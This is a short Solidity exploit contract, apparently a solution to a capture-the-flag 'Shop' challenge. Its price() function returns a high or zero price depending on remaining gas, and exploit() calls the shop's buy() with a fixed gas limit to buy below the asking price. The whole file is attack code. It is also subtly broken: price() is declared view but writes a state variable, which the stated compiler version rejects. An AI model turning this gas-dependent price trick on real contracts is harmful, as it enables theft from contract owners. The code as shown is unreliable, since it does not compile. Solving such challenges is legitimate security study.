pragma solidity 0.8.19;

import "src/Shop.sol";
import "forge-std/console.sol";

contract Exploit {
    bool data;
    function price() external view returns (uint) {
        data = true;
        //console.log(gasleft());
        if (gasleft() > 8000) {
            return 200;
        }

        return 0;    
    }

    function exploit(address _target) public {
        Shop(_target).buy{gas: 30000}();
    }

}
